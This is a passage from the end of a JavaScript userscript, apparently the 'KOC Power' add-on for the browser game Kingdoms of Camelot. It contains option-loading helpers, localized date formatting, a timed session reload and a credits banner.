    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          PortOptions[k][kk] = opts[k][kk];
      else
        PortOptions[k] = opts[k];
    }
  }
}


 
 pdxStartup ();
/********************************************************************************
* 					KOC POWER - PDXSTARTUP END 									*
********************************************************************************/
// DATE
function GetDay(intDay){var DayArray = new Array( culang.scDsun, culang.scDmon, culang.scDtues, culang.scDwen, culang.scDthur, culang.scDfry, culang.scDsat);return DayArray[intDay];}
function GetMonth(intMonth){var MonthArray = new Array(culang.scjan, culang.scfeb, culang.scmar, culang.scapr, culang.scmay, culang.scjun, culang.scjul, culang.scaug, culang.scsep, culang.scokt, culang.scnov, culang.scdec);return MonthArray[intMonth];}
function getDateStrWithDOW(){var today = new Date();var year = today.getYear();
if(year<1000) year+=1900
var todayStr = "<font color=#CCCCFF><b>"+ GetDay(today.getDay()) + "</b></font>"+culang.scthemonth+" ";
todayStr += "<font color=#CCCCFF><b>"+today.getDate() + ". " + GetMonth(today.getMonth()) +"<b></font>";
todayStr += ", " + year;
return todayStr;
}
// RELOAD IF SESSION IS DONE
if (Options.sessionRefresh) {
window.setTimeout(function() { 
	var rflction = top.location;
	top.window.location.href = ""
	top.window.location.href = ""+rflction+"";
	} , 1800000);
}


function readLangOptions (){
s = GM_getValue ('LangOptions_');
if (s != null){
opts = JSON2.parse (s);
for (k in opts){
if (matTypeof(opts[k]) == 'object')
for (kk in opts[k])
LangOptions[k][kk] = opts[k][kk];
else
LangOptions[k] = opts[k];
}
}
};
function matTypeof (v){
  if (v == undefined)
    return 'undefined';
  if (typeof (v) == 'object'){
    if (!v)
      return 'null';
//    else if (unsafeWindow.Object.prototype.toString.apply(v) === '[object Array]')
    else if (v.constructor.toString().indexOf("Array")>=0 && typeof(v.splice)=='function')
      return 'array';
    else return 'object';
  }
  return typeof (v);
};
/**********************************************************************************
							KOC POWER - END
			greetz fly out to jontey, Nico De Belder, Tom Chapin
				this Script was done by koc.god-like.org
**********************************************************************************/
